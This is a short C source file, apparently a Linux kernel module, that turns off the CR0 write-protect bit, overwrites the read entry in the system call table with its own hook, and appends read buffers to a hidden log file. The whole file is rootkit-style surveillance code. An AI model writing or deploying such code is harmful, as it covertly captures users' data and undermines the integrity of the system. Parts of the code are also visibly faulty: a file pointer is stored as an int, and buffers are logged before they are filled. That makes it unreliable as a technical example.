#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
/* #include <asm/cacheflush.h> */
#include <asm/uaccess.h>
/* #include <asm/syscall.h> */



void  **sys_call_table[];
asmlinkage size_t (*og_sys_read)(int filedes, void *buf, size_t bytes);

static void floglog(char *filename, char *data)
{
  struct file *file;
  int fd;
  loff_t pos = 0;

  mm_segment_t old_fs = get_fs();
  set_fs(KERNEL_DS);

  fd = filp_open(filename, O_WRONLY|O_CREAT|O_APPEND, 0644);
  if (fd >= 0) {
    /* sys_write(fd, data, strlen(data)); */
    file = fget(fd);
    if (file) {
      vfs_write(file, data, strlen(data), &pos);
      fput(file);
    }
    sys_close(fd);
  }
  set_fs(old_fs);
}

asmlinkage size_t flog_read(int filedes, void *buf, size_t bytes)
{
  char *flogf = "/usr/var/flogfile.log";
  printk("it\'s flogging time!\n");
  floglog(flogf, buf);
  return og_sys_read(filedes, buf, bytes);
}

/* NOTE: this is depreciated, use alt method for */
/* disabling page write protection */
/* int set_pg_rw(long unsigned int addr) */
/* { */
/*   struct page *pg; */
/*   pgprot_t prot; */
/*   pg = virt_to_page(addr); */
/*   prot.pgprot = VM_READ | VM_WRITE; */
/*   return change_page_attr(pg, 1, prot); */
/* } */

/* int set_pg_ro(long unsigned int addr) */
/* { */
/*   struct page *pg; */
/*   pgprot_t prot; */
/*   pg = virt_to_page(addr); */
/*   prot.pgprot = VM_READ; */
/*   return change_page_attr(pg, 1, prot); */
/* } */

static void dsbl_pg_prot(void) {
  unsigned long pgval;
  asm volatile("mov %%cr0, %0" 
	       :"=r" (pgval));
  if (pgval & 0x00010000) {
    pgval &= ~0x00010000;
    asm volatile("mov %0,%%cr0"
		 :
		 : "r" (pgval));
  }
}

static void enbl_pg_prot(void) {
  unsigned long pgval;
  asm volatile("mov %%cr0, %0" 
	       :"=r" (pgval));
  if (!(pgval & 0x00010000)) {
    pgval |= 0x00010000;
    asm volatile("mov %0,%%cr0"
		 :
		 : "r" (pgval));
  }
}

int init_module()
{
  dsbl_pg_prot();
  og_sys_read = sys_call_table[__NR_read];
  sys_call_table[__NR_read] = flog_read;
  enbl_pg_prot();
  return 0;
}

void cleanup_module()
{
  dsbl_pg_prot();
  sys_call_table[__NR_read] = og_sys_read;
  enbl_pg_prot();
  printk("done flogging!\n");
}
